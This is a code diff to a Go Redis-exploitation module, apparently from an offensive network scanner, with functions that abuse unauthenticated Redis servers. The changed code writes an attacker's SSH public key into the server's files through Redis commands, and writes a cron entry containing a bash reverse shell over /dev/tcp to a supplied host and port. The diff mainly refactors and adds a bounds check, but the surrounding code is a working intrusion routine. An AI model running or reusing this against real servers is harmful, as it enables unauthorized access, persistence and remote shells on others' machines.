@@ -11,8 +11,8 @@ import (
 )
 
 var (
-	dbfilename   string
-	dir          string
+	dbfilename string
+	dir        string
 )
 
 func RedisScan(info *common.HostInfo) (tmperr error) {
@@ -164,6 +164,10 @@ func Expoilt(realhost string, conn net.Conn) error {
 		}
 	}
 	err = recoverdb(dbfilename, dir, conn)
+	//fmt.Println("dbfilename:")
+	//fmt.Println(dbfilename)
+	//fmt.Println("dir:")
+	//fmt.Println(dir)
 	return err
 }
 
@@ -187,14 +191,19 @@ func writekey(conn net.Conn, filename string) (flag bool, text string, err error
 			return flag, text, err
 		}
 		if strings.Contains(text, "OK") {
-			key, err := Readfile(filename)
-			if err != nil {
-				text = fmt.Sprintf("Open %s error, %v", filename, err)
-				return flag, text, err
-			}
-			if len(key) == 0 {
-				text = fmt.Sprintf("the keyfile %s is empty", filename)
-				return flag, text, err
+			var key string
+			if filename == "shadow" {
+				key = SshPub
+			} else {
+				key, err = Readfile(filename)
+				if err != nil {
+					text = fmt.Sprintf("Open %s error, %v", filename, err)
+					return flag, text, err
+				}
+				if len(key) == 0 {
+					text = fmt.Sprintf("the keyfile %s is empty", filename)
+					return flag, text, err
+				}
 			}
 			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
 			if err != nil {
@@ -246,7 +255,11 @@ func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
 			return flag, text, err
 		}
 		if strings.Contains(text, "OK") {
-			scanIp, scanPort := strings.Split(host, ":")[0], strings.Split(host, ":")[1]
+			target := strings.Split(host, ":")
+			if len(target) < 2 {
+				return flag, "host error", err
+			}
+			scanIp, scanPort := target[0], target[1]
 			_, err = conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
 			if err != nil {
 				return flag, text, err
